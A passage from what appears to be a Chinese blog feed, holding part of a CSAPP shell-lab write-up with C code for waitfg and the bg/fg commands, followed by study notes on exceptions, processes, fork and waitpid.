class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">waitfg</span><span class="params">(<span class="keyword">pid_t</span> pid)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">sigset_t</span> mask, prev;</span><br><span class="line">    sigemptyset(&amp;mask);</span><br><span class="line">    sigaddset(&amp;mask, SIGCHLD);</span><br><span class="line">    sigprocmask(SIG_BLOCK, &amp;mask, &amp;prev);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> *<span class="title">fg_job</span> =</span> getjobpid(jobs, pid);</span><br><span class="line">    <span class="keyword">while</span> (fg_job &amp;&amp; fg_job-&gt;state == FG)</span><br><span class="line">    &#123;</span><br><span class="line">         <span class="comment">/* Always reutnr -1 */</span></span><br><span class="line">        sigsuspend(&amp;prev);</span><br><span class="line">    &#125;</span><br><span class="line">    sigprocmask(SIG_SETMASK, &amp;prev, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其他的信号函数也应该这样写，严格按照官方指南来。这个给我的教训是，如果想更改官方指南默认的使用方法，那么在这之前应该非常的了解这个功能的实现原理，否则会为自己带来不必要的麻烦。</p><h2 id="do-bgfg"><a href="#do-bgfg" class="headerlink" title="do_bgfg"></a>do_bgfg</h2><p>将指定作业转为后台或前台运行，需要进行以下几个操作：</p><ul><li>如果该进程状态为ST，则向指定作业发送重启信号。特殊的一点是，在这里可以无脑的发送SIGCONT信号，因为程序默认忽略该信号</li><li>前台需要显示的等待，后台作业则不需要</li><li>对于一些违法参数要进行相应的处理</li></ul><h3 id="bg"><a href="#bg" class="headerlink" title="bg"></a>bg</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> *<span class="title">job</span>;</span></span><br><span class="line"><span class="keyword">sigset_t</span> mask_all, prev_all;</span><br><span class="line">sigfillset(&amp;mask_all);</span><br><span class="line">sigprocmask(SIG_BLOCK, &amp;mask_all, &amp;prev_all);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;bg&quot;</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (argv[<span class="number">1</span>] != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// Need to improve</span></span><br><span class="line">        <span class="keyword">if</span> (argv[<span class="number">1</span>][<span class="number">0</span>] == <span class="string">&#x27;%&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> jid = atoi(argv[<span class="number">1</span>] + <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> (jid)</span><br><span class="line">            &#123;</span><br><span class="line">                job = getjobjid(jobs, jid);</span><br><span class="line">                <span class="keyword">if</span> (job)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">int</span> state = job-&gt;state;</span><br><span class="line">                    <span class="keyword">if</span> (state == ST)</span><br><span class="line">                        kill(-job-&gt;pid, SIGCONT);</span><br><span class="line">                    job-&gt;state = BG;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;[%d] (%d) %s&quot;</span>, job-&gt;jid, job-&gt;pid, job-&gt;cmdline);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;(%s): No such job\n&quot;</span>, argv[<span class="number">1</span>]);</span><br><span class="line">                &#125;</span><br><span class="line">                sigprocmask(SIG_SETMASK, &amp;prev_all, <span class="literal">NULL</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;bg: argument must be a PID or %%jobid\n&quot;</span>);</span><br><span class="line">                sigprocmask(SIG_SETMASK, &amp;prev_all, <span class="literal">NULL</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> pid = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">            <span class="keyword">if</span>(pid)</span><br><span class="line">            &#123;</span><br><span class="line">                job = getjobpid(jobs, pid);</span><br><span class="line">                <span class="keyword">if</span> (job)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">int</span> state = job-&gt;state;</span><br><span class="line">                    <span class="keyword">if</span> (state == ST)</span><br><span class="line">                        kill(-job-&gt;pid, SIGCONT);</span><br><span class="line">                    job-&gt;state = BG;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;[%d] (%d) %s&quot;</span>, job-&gt;jid, job-&gt;pid, job-&gt;cmdline);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;(%s): No such Process\n&quot;</span>, argv[<span class="number">1</span>]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;bg: argument must be a PID or %%jobid\n&quot;</span>);</span><br><span class="line">                sigprocmask(SIG_SETMASK, &amp;prev_all, <span class="literal">NULL</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        sigprocmask(SIG_SETMASK, &amp;prev_all, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;bg command requires PID or %%jobid argument\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要注意的是如果参数使用的是JID格式，那么要注意开头的<code>%</code>符号。因为<code>atoi</code>接收的参数为字符串指针，所以需要写成<code>argv[1]+1</code>格式，这样得到的是指向<code>%</code>符号下一个字符的指针。</p><h3 id="fg"><a href="#fg" class="headerlink" title="fg"></a>fg</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (argv[<span class="number">1</span>] != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (argv[<span class="number">1</span>][<span class="number">0</span>] == <span class="string">&#x27;%&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> jid = atoi(argv[<span class="number">1</span>] + <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> (jid)</span><br><span class="line">            &#123;</span><br><span class="line">                job = getjobjid(jobs, jid);</span><br><span class="line">                <span class="keyword">if</span> (job)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span> (job-&gt;state == BG)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">int</span> state = job-&gt;state;</span><br><span class="line">                        job-&gt;state = FG;</span><br><span class="line">                        sigprocmask(SIG_SETMASK, &amp;prev_all, <span class="literal">NULL</span>);</span><br><span class="line">                        <span class="comment">// waitfg must execute before kill(send signal)</span></span><br><span class="line">                        <span class="keyword">if</span> (state == ST)</span><br><span class="line">                            kill(-job-&gt;pid, SIGCONT);</span><br><span class="line">                        waitfg(job-&gt;pid);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;(%s): No such job\n&quot;</span>, argv[<span class="number">1</span>]);</span><br><span class="line">                    sigprocmask(SIG_SETMASK, &amp;prev_all, <span class="literal">NULL</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;fg: argument must be a PID or %%jobid\n&quot;</span>);</span><br><span class="line">                sigprocmask(SIG_SETMASK, &amp;prev_all, <span class="literal">NULL</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> pid = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">            <span class="keyword">if</span> (pid)</span><br><span class="line">            &#123;</span><br><span class="line">                job = getjobpid(jobs, pid);</span><br><span class="line">                <span class="keyword">if</span> (job) </span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">int</span> state = job-&gt;state;</span><br><span class="line">                    job-&gt;state = FG;</span><br><span class="line">                    sigprocmask(SIG_SETMASK, &amp;prev_all, <span class="literal">NULL</span>);</span><br><span class="line">                    <span class="comment">// waitfg must execute before kill(send signal)</span></span><br><span class="line">                    <span class="keyword">if</span> (state == ST)</span><br><span class="line">                        kill(-job-&gt;pid, SIGCONT);</span><br><span class="line">                    waitfg(job-&gt;pid);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;(%s): No such Process\n&quot;</span>, argv[<span class="number">1</span>]);</span><br><span class="line">                    sigprocmask(SIG_SETMASK, &amp;prev_all, <span class="literal">NULL</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;fg: argument must be a PID or %%jobid\n&quot;</span>);</span><br><span class="line">                sigprocmask(SIG_SETMASK, &amp;prev_all, <span class="literal">NULL</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        sigprocmask(SIG_SETMASK, &amp;prev_all, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;fg command requires PID or %%jobid argument\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span>;</span><br></pre></td></tr></table></figure><p>将进程恢复到前台运行与上面过程相似，只不过需要加上<code>waitfg</code>函数来显示的等待子进程。<br>注意：必须在<code>waitfg</code>函数执行前发送<code>SIGCONT</code>信号，否则不会唤醒停止的进程（经作者实验确实出现了此情况）。<br>对于上面结果的可能解释是，<code>sigsuspend</code>阻塞了主进程导致无法执行到<code>kill</code>语句。欢迎大家分享自己的想法。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>因为距离上次做CSAPP的配套实验已经过了一年的时间，这期间也没有太多用c写过程序，而是用像python和php这些高级一点的语言编写代码，所以在进行一些跟底层相关的操作时难免会踩一些坑。不过整体而言该实验难度不算太高，自己也收获和回忆起了很多的知识，接下来继续认真学完整本书，也就算为自己大学生涯划上了一个圆满的句号吧。</p>]]></content>
      
      
      <categories>
          
          <category> 国外课程 </category>
          
          <category> CSAPP </category>
          
          <category> ECF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Unix信号 </tag>
            
            <tag> 进程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSAPP-ECF知识点总结</title>
      <link href="/2022/02/24/CSAPP-ECF%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/"/>
      <url>/2022/02/24/CSAPP-ECF%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="Exception-异常"><a href="#Exception-异常" class="headerlink" title="Exception(异常)"></a>Exception(异常)</h1><p>定义：异常是为了响应系统事件而使控制流突变到操作系统内核的一个过程。<br>内核是操作系统常驻内核的部分，要注意它不是一个单独的进程，而是经常作为其他进程的一部分运行。</p><h1 id="控制流-Control-flow"><a href="#控制流-Control-flow" class="headerlink" title="控制流(Control flow)"></a>控制流(Control flow)</h1><p>定义：  处理器从加电开始到断电结束，会按顺序地一次执行一个指令，这个指令序列叫做控制流(Control flow)。<br>我们知道一个程序可以使用<em>if-else</em>分支、函数调用等来使控制流发生突变，而系统也需要根据系统状态的变化来使控制流发生突变，这种突变被称为**异常控制流(Exception control flow)**。<br>异常控制流同时存在于操作系统的底层和高层部分：</p><ul><li>底层机制<ul><li>异常(Exception)，根据系统事件改变控制流，同时由硬件和系统软件实现。</li></ul></li><li>高层机制<ul><li>进程的上下文切换，由硬件计时器和操作系统软件组成。</li><li>信号，由操作系统软件实现。</li><li>非本地跳转，由C运行时库实现。</li></ul></li></ul><h1 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h1><p>系统中的每种类型的异常均分配了一个唯一的非负整数的**异常号(exception number)**。在系统启动时，操作系统分配和初始化一张称为异常表的跳转表，其中条目k包含异常k的处理程序地址，如下图所示。</p><p><img src="https://s2.loli.net/2022/02/16/dKRNX3PcI5D1xgy.png" alt="image.png"><br>异常表的起始地址存放在属于CPU特殊寄存器的异常表基址寄存器(exception table base register)中，异常号是到异常表中的索引。<br>异常k的条目的地址=异常表起始地址+异常号*4<br>异常与过程调用的不同之处：</p><ul><li>过程调用时，在跳转到处理程序前，处理器会将返回地址(当前指令的下一条指令)压到栈中。但是，根据异常的类型，返回地址为当前指令或下一条指令中的一种。</li><li>在处理异常时，处理器会将一些额外的处理器状态压入栈中，当处理程序返回并重新执行被中断的程序时，会将当前处理器状态设置为所保存的状态。</li><li>如果处理程序要求从用户态转移到内核态，那么所有的信息都会压入到内存栈中。</li><li>异常处理程序运行在内核态下，对所有的系统资源拥有完全的访问权限。</li></ul><h1 id="异常类型"><a href="#异常类型" class="headerlink" title="异常类型"></a>异常类型</h1><h2 id="异步异常-中断-interrupt"><a href="#异步异常-中断-interrupt" class="headerlink" title="异步异常(中断 interrupt)"></a>异步异常(中断 interrupt)</h2><p>中断由处理器外部的事件造成，因为硬件中断不是由任何一条专门的指令造成的，所以称其为异步。硬件中断的异常处理程序称为中断处理程序。<br>工作过程：I/O设备通过向处理器的中断引脚发送信号，并将异常号发送到系统总线上，来触发中断。当中断处理程序返回时，<strong>总会</strong>将控制转移给正常情况下要执行的下一条指令。</p><h2 id="同步异常"><a href="#同步异常" class="headerlink" title="同步异常"></a>同步异常</h2><p>接下来所要介绍的异常是同步发生的，也就是执行当前指令的结果。这类指令又被称为故障指令(faulting instruction)</p><h3 id="陷阱和系统调用-trap"><a href="#陷阱和系统调用-trap" class="headerlink" title="陷阱和系统调用(trap)"></a>陷阱和系统调用(trap)</h3><p>陷阱是人为有意的异常，其处理程序总是将控制返回到下一条指令。陷阱最重要的作用是在用户程序和内核之间提供一个像过程一样的接口，叫做系统调用。比如，system calls，gdb断点。<br>系统调用是通过处理器提供的一条特殊指令<code>syscall n</code>实现的，它看起来与普通函数调用没什么区别，但是后者运行在用户模式中，前者运行在内核模式中，允许系统调用可以执行特权指令，并且访问定义在内核中的栈。<br>每个x86-64系统调用都有一个唯一的非负整数号。</p><table><thead><tr><th align="center">数字</th><th align="center">名字</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">0</td><td align="center">read</td><td align="center">读取文件</td></tr><tr><td align="center">1</td><td align="center">write</td><td align="center">写文件</td></tr><tr><td align="center">2</td><td align="center">open</td><td align="center">打开文件</td></tr><tr><td align="center">3</td><td align="center">close</td><td align="center">关闭文件</td></tr><tr><td align="center">4</td><td align="center">stat</td><td align="center">获得文件信息</td></tr><tr><td align="center">57</td><td align="center">fork</td><td align="center">创建进程</td></tr></tbody></table><p>在Linux/x86-64系统上，每个系统调用的整数号，对应于一个到内核中跳转表的偏移量。(这个跳转表并不是异常表)</p><h3 id="故障-fault"><a href="#故障-fault" class="headerlink" title="故障(fault)"></a>故障(fault)</h3><p>故障是由错误情况引起的，可能被故障处理程序修正。故障发生时，处理器会将控制权交给故障处理程序。如果故障被成功修复，那么就会将控制权重新交给引起故障的指令，否则，故障处理程序会返回到内核中的abort例程，而abort例程会终止引起故障的应用程序。<br>例子：虚拟内存的缺页异常(可恢复)，一般保护性故障(不可恢复)，浮点异常(不可恢复)。</p><h3 id="终止-abort"><a href="#终止-abort" class="headerlink" title="终止(abort)"></a>终止(abort)</h3><p>终止由不可恢复的致命错误造成，处理程序会将控制转移给abort例程，终止应用程序。</p><h1 id="Process-进程"><a href="#Process-进程" class="headerlink" title="Process(进程)"></a>Process(进程)</h1><p>定义：an instance of a running program.<br>进程是一种对操作系统资源的抽象，用户看起来会感觉每个进程是独占CPU和内存资源的。<br>Linux提供了一个叫做/proc文件系统的机制，它允许用户模式下的进程访问内核数据结构中的内容。比如<code>/proc/cpuinfo</code>可以访问CPU类型，<code>/proc/&lt;process-id&gt;/map</code>可以访问进程使用的内存段。</p><h2 id="逻辑流"><a href="#逻辑流" class="headerlink" title="逻辑流"></a>逻辑流</h2><p>定义：在程序开始到结束这个时间内，PC(程序计数器)中值的序列叫做逻辑控制流，简称逻辑流。<br>并发流(concurrent flow)，：两个进程的逻辑流在执行过程中发生时间上的重叠。多个流并发执行的现象被称为并发。并行流(parallel flow)是并发流的一个真子集，我们把运行在不同处理器或计算机上的并发流称为并行流。</p><h2 id="上下文切换-context-switch"><a href="#上下文切换-context-switch" class="headerlink" title="上下文切换(context switch)"></a>上下文切换(context switch)</h2><p>上下文切换是实现操作系统多任务的基石，内核为每个进程维护一个上下文，其中包含内核重新启动一个被抢占进程所需要的状态。<br>上下文由对象的一些值组成，包含的对象有通用目的寄存器、浮点寄存器、程序计数器、用户栈、状态寄存器、内核栈和各种内核数据结构(页表、进程表和文件表)。<br><img src="https://s2.loli.net/2022/02/17/fpYZhKOvmSQlcjr.png" alt="image.png"></p><h1 id="进程控制-process-control"><a href="#进程控制-process-control" class="headerlink" title="进程控制(process control)"></a>进程控制(process control)</h1><h2 id="获取进程ID"><a href="#获取进程ID" class="headerlink" title="获取进程ID"></a>获取进程ID</h2><p>每个进程都拥有唯一的非负整数ID(PID)。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">pid_t</span> <span class="title">getpid</span><span class="params">(<span class="keyword">void</span>)</span></span>; <span class="comment">// 返回当前进程PID</span></span><br><span class="line"><span class="function"><span class="keyword">pid_t</span> <span class="title">getppid</span><span class="params">(<span class="keyword">void</span>)</span></span>; <span class="comment">// 返回当前父进程的PID</span></span><br></pre></td></tr></table></figure><h2 id="进程的生命周期"><a href="#进程的生命周期" class="headerlink" title="进程的生命周期"></a>进程的生命周期</h2><ul><li>运行。进程要么在CPU上正在执行，要么等待被内核调度执行。</li><li>停止。进程执行时被挂起，直到接收到通知才会被调度。</li><li>终止。进程被永远地停止运行。<ul><li>收到一个信号，该信号的默认行为是终止进程。</li><li>从主程序返回</li><li>调用exit函数</li></ul></li></ul><h3 id="终止进程"><a href="#终止进程" class="headerlink" title="终止进程"></a>终止进程</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">exit</span><span class="params">(<span class="keyword">int</span> status)</span></span>; <span class="comment">// 调用一次永不返回</span></span><br></pre></td></tr></table></figure><p>以退出状态<code>status</code>来终止进程，按照以往习惯来说，0代表正常返回，非0代表发生错误。另外一种显示的设置退出状态的方法是在main例程中返回一个整数值。</p><h3 id="创建进程"><a href="#创建进程" class="headerlink" title="创建进程"></a>创建进程</h3><p>父进程通过调用fork函数，来创建一个新的子进程。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">pid_t</span> <span class="title">fork</span><span class="params">(<span class="keyword">void</span>)</span></span>; <span class="comment">// 调用一次返回两次</span></span><br></pre></td></tr></table></figure><p>父子进程的相同和不同点：</p><ul><li>相同点<ul><li>子进程拥有与父进程相同但是单独的用户级虚拟地址空间副本，包括代码和数据堆、栈、共享库以及用户栈</li><li>子进程拥有父进程已打开文件描述符的相同副本(继承父进程打开的所有文件)</li></ul></li><li>不同点<ul><li>两者PID不同</li></ul></li></ul><p><code>fork</code>函数返回两次，对父进程返回子进程的PID，子进程返回0。<br>子进程创建图：<br><img src="https://s2.loli.net/2022/02/17/HfpaULdqEbtnQo5.png" alt="image.png"></p><h4 id="虚拟内存与内存映射的作用"><a href="#虚拟内存与内存映射的作用" class="headerlink" title="虚拟内存与内存映射的作用"></a>虚拟内存与内存映射的作用</h4><p>虚拟内存和内存映射机制可以为新创建的进程提供私有的内存空间，过程如下：</p><ul><li>创建与父进程相同的mm_struct、vm_area_struct和页表</li><li>将父子进程的页标为只读</li><li>将父子进程的vm_area_struct标为私有的写时复制</li></ul><p>当fork函数过多时，可以使用进程图(一种简单的前趋图)来整理创建的过程，有助于了解并行过程。该图所有顶点的拓扑排序代表程序语句中一个可行的全序排列。</p><div class="note info simple"><p>排列是一个拓扑排序，当且仅当顶点序列从左到右画出的每条有向边方向都是从左向右的。</p></div><h2 id="回收子进程"><a href="#回收子进程" class="headerlink" title="回收子进程"></a>回收子进程</h2><p>当一个进程终止时，内核并不会立即将它从系统中清除，而是保持在一种已终止的状态下(此时还在占用着系统资源)，直到被它的父进程回收(reaped)。<br>回收过程如下：</p><ul><li>父进程执行<code>wait</code>或<code>waitpid</code>命令来回收终止的子进程</li><li>内核将子进程的退出状态传递给父进程</li><li>内核删除僵尸子进程</li></ul><p><strong>特殊情况</strong>：如果父进程在未回收子进程前被终止，那么孤儿进程将被init进程回收。<br>init进程PID为1，是在系统启动时由内核创建的，不会终止，是所有进程的祖先。<br>还有一种情况是父进程终止而子进程没有被终止，这种情况下必须手动kill掉，否则子进程会永远的运行下去。<br>进程可以使用<code>waitpid</code>函数来回收子进程。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">pid_t</span> <span class="title">waitpid</span><span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">int</span> *statusp, <span class="keyword">int</span> options)</span></span></span><br></pre></td></tr></table></figure><p>默认情况下<code>waitpid</code>函数会挂起调用进程直到它等待集合(wait set)中的一个子进程终止，并返回导致函数返回的已终止进程的PID。这时，已终止的子进程就被彻底回收了，内核会删除其在系统中的痕迹。</p><div class="note warning simple"><p>waitpid只能回收儿子进程，而不能回收孙子进程。</p></div><p>wait是waitpid函数的简单版本，调用<code>wait(&amp;status)</code>相当于调用<code>waitpid(-1, &amp;status, 0)</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">pid_t</span> <span class="title">wait</span><span class="params">(<span class="keyword">int</span> *statusp)</span></span>;</span><br></pre></td></tr></table></figure><h3 id="判断等待集合的成员"><a href="#判断等待集合的成员" class="headerlink" title="判断等待集合的成员"></a>判断等待集合的成员</h3><p>wait set由参数pid确定。</p><ul><li>pid&gt;0，等待集合为一个单独的子进程，进程ID等于pid。</li><li>pid=-1，等待集合由父进程所有的子进程组成</li><li>也支持其他类型的等待集合，具体的可查看<a href="https://www.ibm.com/docs/en/zos/2.1.0?topic=functions-waitpid-wait-specific-child-process-end">文档</a>。</li></ul><h3 id="修改默认行为"><a href="#修改默认行为" class="headerlink" title="修改默认行为"></a>修改默认行为</h3><p>通过修改<code>options</code>来改变默认的行为</p><ul><li>WNOHANG：如果等待集合中的任何子进程都还没有终止，则立即返回0。默认的行为是挂起调用进程，直到有子进程终止。这个选项可以在等待子进程终止时，做一些其他的工作。在检查是否存在已经死掉的子进程时很有用。</li><li>WUNTRACED：挂起调用进程，直到等待集合中的一个进程变为已终止或<em>被停止</em>状态。这个选项在检查因收到停止信号<code>SIGSTOP</code>而停止的子进程时很有用，可以有效的避免父进程因无限等待而陷入死锁的状态。</li><li>WCONTINUED：挂起调用进程的执行，直到等待集合中一个正在运行的进程终止或等待集合中一个被停止的进程收到<code>SIGCONT</code>信号重新开始执行。</li></ul><p>这些选项可以组合起来使用。比如：<code>WNOHANG | WUNTRACED</code></p><h3 id="检查已回收子进程的退出状态"><a href="#检查已回收子进程的退出状态" class="headerlink" 